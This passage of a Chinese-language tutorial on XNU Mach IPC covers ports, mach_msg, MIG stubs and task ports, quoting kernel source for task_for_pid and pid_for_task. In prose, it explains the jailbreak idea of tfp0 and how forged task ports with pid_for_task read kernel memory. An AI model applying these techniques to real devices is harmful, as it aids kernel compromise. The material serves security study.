<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">kern_return_t</span> kret;</span><br><span class="line"><span class="comment">// Initialize a port</span></span><br><span class="line"><span class="type">mach_port_t</span> port;</span><br><span class="line"><span class="comment">// Allocate the port and get a receive right</span></span><br><span class="line">kret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;port);</span><br><span class="line"><span class="keyword">if</span> (kret != KERN_SUCCESS)</span><br><span class="line">	T_FAIL(<span class="string">&quot;mach_port_allocate: %s (%d)&quot;</span>, mach_error_string(kret), kret);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Routine:	mach_msg_overwrite</span></span><br><span class="line"><span class="comment"> *	Purpose:</span></span><br><span class="line"><span class="comment"> *		Send and/or receive a message.  If the message operation</span></span><br><span class="line"><span class="comment"> *		is interrupted, and the user did not request an indication</span></span><br><span class="line"><span class="comment"> *		of that fact, then restart the appropriate parts of the</span></span><br><span class="line"><span class="comment"> *		operation silently (trap version does not restart).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *		Distinct send and receive buffers may be specified.  If</span></span><br><span class="line"><span class="comment"> *		no separate receive buffer is specified, the msg parameter</span></span><br><span class="line"><span class="comment"> *		will be used for both send and receive operations.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *		In addition to a distinct receive buffer, that buffer may</span></span><br><span class="line"><span class="comment"> *		already contain scatter control information to direct the</span></span><br><span class="line"><span class="comment"> *		receiving of the message.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__WATCHOS_PROHIBITED __TVOS_PROHIBITED</span><br><span class="line"><span class="keyword">extern</span> <span class="type">mach_msg_return_t</span>	<span class="title function_">mach_msg_overwrite</span><span class="params">(</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_header_t</span> *msg,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_option_t</span> option,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_size_t</span> send_size,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_size_t</span> rcv_size,</span></span><br><span class="line"><span class="params">					<span class="type">mach_port_name_t</span> rcv_name,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_timeout_t</span> timeout,</span></span><br><span class="line"><span class="params">					<span class="type">mach_port_name_t</span> notify,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_header_t</span> *rcv_msg,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_size_t</span> rcv_limit)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span>	KERNEL</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Routine:	mach_msg</span></span><br><span class="line"><span class="comment"> *	Purpose:</span></span><br><span class="line"><span class="comment"> *		Send and/or receive a message.  If the message operation</span></span><br><span class="line"><span class="comment"> *		is interrupted, and the user did not request an indication</span></span><br><span class="line"><span class="comment"> *		of that fact, then restart the appropriate parts of the</span></span><br><span class="line"><span class="comment"> *		operation silently (trap version does not restart).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__WATCHOS_PROHIBITED __TVOS_PROHIBITED</span><br><span class="line"><span class="keyword">extern</span> <span class="type">mach_msg_return_t</span>	<span class="title function_">mach_msg</span><span class="params">(</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_header_t</span> *msg,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_option_t</span> option,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_size_t</span> send_size,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_size_t</span> rcv_size,</span></span><br><span class="line"><span class="params">					<span class="type">mach_port_name_t</span> rcv_name,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_timeout_t</span> timeout,</span></span><br><span class="line"><span class="params">					<span class="type">mach_port_name_t</span> notify)</span>;</span><br></pre></td></tr></table></figure>

<p>如果有一个端口的发送权限，可以使用<code>mach_port_insert_right</code>将这个发送权限插入另一个任务，然后使用<code>mach_msg</code>发送消息。如前所述，<code>mach_port_name_t</code>在任务命名空间之外毫无意义，这就是为什么需要将<code>任务(ipc_space_t)</code>与<code>mach_port_name_t</code>一起指定的原因，以便内核可以将指定的<code>名称(mach_port_name_t)</code>放入该任务的命名空间。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Routine:	mach_port_insert_right [kernel call]</span></span><br><span class="line"><span class="comment"> *	Purpose:</span></span><br><span class="line"><span class="comment"> *		Inserts a right into a space, as if the space</span></span><br><span class="line"><span class="comment"> *		voluntarily received the right in a message,</span></span><br><span class="line"><span class="comment"> *		except that the right gets the specified name.</span></span><br><span class="line"><span class="comment"> *	Conditions:</span></span><br><span class="line"><span class="comment"> *		Nothing locked.</span></span><br><span class="line"><span class="comment"> *	Returns:</span></span><br><span class="line"><span class="comment"> *		KERN_SUCCESS		Inserted the right.</span></span><br><span class="line"><span class="comment"> *		KERN_INVALID_TASK	The space is null.</span></span><br><span class="line"><span class="comment"> *		KERN_INVALID_TASK	The space is dead.</span></span><br><span class="line"><span class="comment"> *		KERN_INVALID_VALUE	The name isn&#x27;t a legal name.</span></span><br><span class="line"><span class="comment"> *		KERN_NAME_EXISTS	The name already denotes a right.</span></span><br><span class="line"><span class="comment"> *		KERN_INVALID_VALUE	Message doesn&#x27;t carry a port right.</span></span><br><span class="line"><span class="comment"> *		KERN_INVALID_CAPABILITY	Port is null or dead.</span></span><br><span class="line"><span class="comment"> *		KERN_UREFS_OVERFLOW	Urefs limit would be exceeded.</span></span><br><span class="line"><span class="comment"> *		KERN_RIGHT_EXISTS	Space has rights under another name.</span></span><br><span class="line"><span class="comment"> *		KERN_RESOURCE_SHORTAGE	Couldn&#x27;t allocate memory.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">kern_return_t</span></span><br><span class="line"><span class="title function_">mach_port_insert_right</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">ipc_space_t</span>			space,</span></span><br><span class="line"><span class="params">	<span class="type">mach_port_name_t</span>		name,</span></span><br><span class="line"><span class="params">	<span class="type">ipc_port_t</span>			poly,</span></span><br><span class="line"><span class="params">	<span class="type">mach_msg_type_name_t</span>		polyPoly)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (space == IS_NULL)</span><br><span class="line">		<span class="keyword">return</span> KERN_INVALID_TASK;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!MACH_PORT_VALID(name) ||</span><br><span class="line">	    !MACH_MSG_TYPE_PORT_ANY_RIGHT(polyPoly))</span><br><span class="line">		<span class="keyword">return</span> KERN_INVALID_VALUE;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!IO_VALID((<span class="type">ipc_object_t</span>) poly))</span><br><span class="line">		<span class="keyword">return</span> KERN_INVALID_CAPABILITY;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ipc_object_copyout_name(space, (<span class="type">ipc_object_t</span>) poly, </span><br><span class="line">				       polyPoly, FALSE, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="MIG-Mach接口生成器"><a href="#MIG-Mach接口生成器" class="headerlink" title="MIG-Mach接口生成器"></a>MIG-Mach接口生成器</h3><p>使用Mach API编写的许多代码都包含相同的样板代码，多次重复可能会导致复杂性，甚至导致安全漏洞，因此MIG非常方便。它基于MIG规范文件(defs)实现桩函数。客户端可以像调用任何其他C函数一样调用此桩函数，并且桩函数可以处理进出mach消息的数据的编组和解编组，从而控制发生在底层的所有Mach IPC实现。<br>MIG规范文件具有扩展名defs，并且在编译内核时，这些文件由mig处理并生成额外的文件，这些文件包含自动生成的MIG封装器。</p>
<p>以<code>osfmk/mach/task.defs</code>中的<code>task.defs</code>文件为例，每个defs文件都有一个子系统名称，后跟一个任意数字，该数字在文件的开头声明。task.defs文件的子系统名称为task，数字为3400。桩函数还可以检查传递给它的参数的有效性。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">subsystem</span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	KERNEL_SERVER</span></span><br><span class="line">	  KernelServer</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* KERNEL_SERVER */</span></span></span><br><span class="line">	  task <span class="number">3400</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mach/std_types.defs&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mach/mach_types.defs&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mach_debug/mach_debug_types.defs&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Create a new task with an empty set of IPC rights,</span></span><br><span class="line"><span class="comment"> *	and having an address space constructed from the</span></span><br><span class="line"><span class="comment"> *	target task (or empty, if inherit_memory is FALSE).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">routine <span class="title function_">task_create</span><span class="params">(</span></span><br><span class="line"><span class="params">		target_task	: <span class="type">task_t</span>;</span></span><br><span class="line"><span class="params">		ledgers		: <span class="type">ledger_array_t</span>;</span></span><br><span class="line"><span class="params">		inherit_memory	: <span class="type">boolean_t</span>;</span></span><br><span class="line"><span class="params">	out	child_task	: <span class="type">task_t</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>如果要生成MIG封装器，则可以在包含def文件的目录运行mig。</p>
<p>在编译期间，mig工具根据子系统名称创建三个文件。例如对于task子系统，将创建以下文件：</p>
<ul>
<li>taskUser.c-该文件包含代理函数的实现，该代理函数负责将数据编组为消息并发送。它还负责解组返回的数据并将其发送回客户端</li>
<li>task.c-代理函数的原型</li>
<li>taskServer.c-桩函数的实现包含在此文件中</li>
</ul>
<p>在生成的文件中定义了许多大部分是函数的routine。如routine <code>task_set_exception_port</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Routine task_set_exception_ports */</span></span><br><span class="line">mig_internal novalue _Xtask_set_exception_ports</span><br><span class="line">	(<span class="type">mach_msg_header_t</span> *InHeadP, <span class="type">mach_msg_header_t</span> *OutHeadP)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span>  __MigPackStructs</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(push, 4)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="type">mach_msg_header_t</span> Head;</span><br><span class="line">		<span class="comment">/* start of the kernel processed data */</span></span><br><span class="line">		<span class="type">mach_msg_body_t</span> msgh_body;</span><br><span class="line">		<span class="type">mach_msg_port_descriptor_t</span> new_port;</span><br><span class="line">		<span class="comment">/* end of the kernel processed data */</span></span><br><span class="line">		NDR_record_t NDR;</span><br><span class="line">		<span class="type">exception_mask_t</span> exception_mask;</span><br><span class="line">		<span class="type">exception_behavior_t</span> behavior;</span><br><span class="line">		<span class="type">thread_state_flavor_t</span> new_flavor;</span><br><span class="line">		<span class="type">mach_msg_trailer_t</span> trailer;</span><br><span class="line">	&#125; Request __attribute__((unused));</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span>  __MigPackStructs</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(pop)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">typedef</span> __Request__task_set_exception_ports_t __Request;</span><br><span class="line">	<span class="keyword">typedef</span> __Reply__task_set_exception_ports_t Reply __attribute__((unused));</span><br></pre></td></tr></table></figure>

<p><strong>审计这些函数中的代码也非常重要。</strong></p>
<h3 id="任务端口"><a href="#任务端口" class="headerlink" title="任务端口"></a>任务端口</h3><p>Mach端口的另一个有用的功能是它们充当对象的抽象，而该抽象是由Mach消息提供的，这些消息主要通过MIG进行转换。例如，主机Mach端口提供许多API，以获取有关主机的信息。<code>host_kernel_version()</code>函数将打印内核版本。这与<code>uname -r</code>命令使用的API相同。查看<code>osfmk/mach/mach_host.defs</code>文件将显示主机端口API提供的所有routine。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Return information about this host.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">routine <span class="title function_">host_info</span><span class="params">(</span></span><br><span class="line"><span class="params">		host		: <span class="type">host_t</span>;</span></span><br><span class="line"><span class="params">		flavor		: <span class="type">host_flavor_t</span>;</span></span><br><span class="line"><span class="params">	out	host_info_out	: <span class="type">host_info_t</span>, CountInOut)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Get string describing current kernel version.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">routine	<span class="title function_">host_kernel_version</span><span class="params">(</span></span><br><span class="line"><span class="params">		host		: <span class="type">host_t</span>;</span></span><br><span class="line"><span class="params">	out	kernel_version	: <span class="type">kernel_version_t</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>类似，任务端口用作任务的抽象。可以在<code>osfmk/mach/task.def</code>或者BUILD文件夹中的<code>osfmk/mach/task.defs</code>找到这些API。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Read the selected state which is to be installed on new </span></span><br><span class="line"><span class="comment"> * threads in the task as they are created.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">routine <span class="title function_">task_get_state</span><span class="params">(</span></span><br><span class="line"><span class="params">		task		: <span class="type">task_t</span>;</span></span><br><span class="line"><span class="params">		flavor		: <span class="type">thread_state_flavor_t</span>;</span></span><br><span class="line"><span class="params">	out	old_state	: <span class="type">thread_state_t</span>, CountInOut)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Set the selected state information to be installed on</span></span><br><span class="line"><span class="comment"> * all subsequently created threads in the task.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">routine	<span class="title function_">task_set_state</span><span class="params">(</span></span><br><span class="line"><span class="params">		task		: <span class="type">task_t</span>;</span></span><br><span class="line"><span class="params">		flavor		: <span class="type">thread_state_flavor_t</span>;</span></span><br><span class="line"><span class="params">		new_state	: <span class="type">thread_state_t</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Change the task&#x27;s physical footprint limit (in MB).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">routine <span class="title function_">task_set_phys_footprint_limit</span><span class="params">(</span></span><br><span class="line"><span class="params">		task		: <span class="type">task_t</span>;</span></span><br><span class="line"><span class="params">		new_limit	: <span class="type">int</span>;</span></span><br><span class="line"><span class="params">	out old_limit	: <span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line">routine <span class="title function_">task_suspend2</span><span class="params">(</span></span><br><span class="line"><span class="params">		target_task : <span class="type">task_t</span>;</span></span><br><span class="line"><span class="params">	out suspend_token : <span class="type">task_suspension_token_t</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>这些API十分强大，可以与目标进程进行完全交互。具有进程的任务端口的发送权限将完全控制该任务，包括在目标任务内存区域中读取，写入和分配内存。这里提到的是进程(来自BSD)的任务(来自Mach)端口，需要注意的是，它们内部是有联系的。每个BSD进程都有一个对应的Mach任务，反之亦然。可以在<code>osfmk/kern/task.h</code>下找到task结构体，其中的<code>bsd_info</code>指向<code>bsd/sys/proc_internal.h</code>中的proc结构体。同样，proc结构体中的task是指向该进程的task结构体的指针。</p>
<p><img src="https://highaltitudehacks.com/images/21.png" alt="21"></p>
<p>使用Mach系统调用<code>task_for_pid()</code>，可以将与目标PID相对应的任务端口的发送权限发送给调用方。从<code>bsd/vm/vm_unix.c</code>中的以下注释可以看出，仅允许特权进程或具有相同用户ID的进程调用。除此之外，调用此API还需要某些权限<code>get-task-allow</code>和<code>task_for_pid-allow</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Routine:	task_for_pid</span></span><br><span class="line"><span class="comment"> *	Purpose:</span></span><br><span class="line"><span class="comment"> *		Get the task port for another &quot;process&quot;, named by its</span></span><br><span class="line"><span class="comment"> *		process ID on the same host as &quot;target_task&quot;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *		Only permitted to privileged processes, or processes</span></span><br><span class="line"><span class="comment"> *		with the same user ID.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *		Note: if pid == 0, an error is return no matter who is calling.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * XXX This should be a BSD system call, not a Mach trap!!!</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">kern_return_t</span></span><br><span class="line"><span class="title function_">task_for_pid</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="keyword">struct</span> task_for_pid_args *args)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">mach_port_name_t</span>	target_tport = args-&gt;target_tport;</span><br><span class="line">	<span class="type">int</span>			pid = args-&gt;pid;</span><br><span class="line">	<span class="type">user_addr_t</span>		task_addr = args-&gt;t;</span><br><span class="line">	<span class="type">proc_t</span> 			p = PROC_NULL;</span><br><span class="line">	<span class="type">task_t</span>			t1 = TASK_NULL;</span><br><span class="line">	<span class="type">task_t</span>			task = TASK_NULL;</span><br><span class="line">	<span class="type">mach_port_name_t</span>	tret = MACH_PORT_NULL;</span><br><span class="line">	<span class="type">ipc_port_t</span> 		tfpport = MACH_PORT_NULL;</span><br><span class="line">	<span class="type">void</span> * sright;</span><br><span class="line">	<span class="type">int</span> error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	AUDIT_MACH_SYSCALL_ENTER(AUE_TASKFORPID);</span><br><span class="line">	AUDIT_ARG(pid, pid);</span><br><span class="line">	AUDIT_ARG(mach_port1, target_tport);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Always check if pid == 0 */</span></span><br><span class="line">	<span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">		(<span class="type">void</span> ) copyout((<span class="type">char</span> *)&amp;t1, task_addr, <span class="keyword">sizeof</span>(<span class="type">mach_port_name_t</span>));</span><br><span class="line">		AUDIT_MACH_SYSCALL_EXIT(KERN_FAILURE);</span><br><span class="line">		<span class="keyword">return</span>(KERN_FAILURE);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>有一点是需要注意的，<code>task_for_pid()</code>始终会检查pid是否为0，以防止通过调用<code>task_for_pid(0)</code>获取到内核任务端口的发送权限，这个操作叫tfp0。在之前，一旦能够任意读写内核内存，越狱程序就会patch该检查并调用task_for_pid(0)。但是随着KPP和AMCC&#x2F;KTRR的出现，不再能patch内核，因此使用了其它技术。<strong>tfp0这个叫法仍然存在，用于表示读写内核内存。</strong></p>
<p>另一个非常常用的API是Mach系统调用<code>pid_for_task()</code>，用于查找与给定Mach任务相对应的进程的pid。它通常做的是查找task结构体，查找其中的<code>bsd_info</code>指向的内核中的proc结构体，并从proc结构体中读取p_pid。此技术已被广泛用于通过创建伪造的任务端口一次读取任意四个字节的内核内存（因为pid为32位）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * pid_for_task</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Find the BSD process ID for the Mach task associated with the given Mach port </span></span><br><span class="line"><span class="comment"> * name</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Parameters:	args		User argument descriptor (see below)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Indirect parameters:	args-&gt;t		Mach port name</span></span><br><span class="line"><span class="comment"> * 			args-&gt;pid	Process ID (returned value; see below)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns:	KERL_SUCCESS	Success</span></span><br><span class="line"><span class="comment"> * 		KERN_FAILURE	Not success           </span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Implicit returns: args-&gt;pid		Process ID</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">kern_return_t</span></span><br><span class="line"><span class="title function_">pid_for_task</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="keyword">struct</span> pid_for_task_args *args)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">mach_port_name_t</span>	t = args-&gt;t;</span><br><span class="line">	<span class="type">user_addr_t</span>		pid_addr  = args-&gt;pid;  </span><br><span class="line">	<span class="type">proc_t</span> p;</span><br><span class="line">	<span class="type">task_t</span>		t1;</span><br><span class="line">	<span class="type">int</span>	pid = <span class="number">-1</span>;</span><br><span class="line">	<span class="type">kern_return_t</span>	err = KERN_SUCCESS;</span><br><span class="line"></span><br><span class="line">	AUDIT_MACH_SYSCALL_ENTER(AUE_PIDFORTASK);</span><br><span class="line">	AUDIT_ARG(mach_port1, t);</span><br><span class="line"></span><br><span class="line">	t1 = port_name_to_task_inspect(t);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (t1 == TASK_NULL) &#123;</span><br><span class="line">		err = KERN_FAILURE;</span><br><span class="line">		<span class="keyword">goto</span> pftout;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		p = get_bsdtask_info(t1);</span><br><span class="line">		<span class="keyword">if</span> (p) &#123;</span><br><span class="line">			pid  = proc_pid(p);</span><br><span class="line">			err = KERN_SUCCESS;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_corpsetask(t1)) &#123;</span><br><span class="line">			pid = task_pid(t1);</span><br><span class="line">			err = KERN_SUCCESS;</span><br><span class="line">		&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">			err = KERN_FAILURE;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	task_deallocate(t1);</span><br><span class="line">pftout:</span><br><span class="line">	AUDIT_ARG(pid, pid);</span><br><span class="line">	(<span class="type">void</span>) copyout((<span class="type">char</span> *) &amp;pid, pid_addr, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">	AUDIT_MACH_SYSCALL_EXIT(err);</span><br><span class="line">	<span class="keyword">return</span>(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

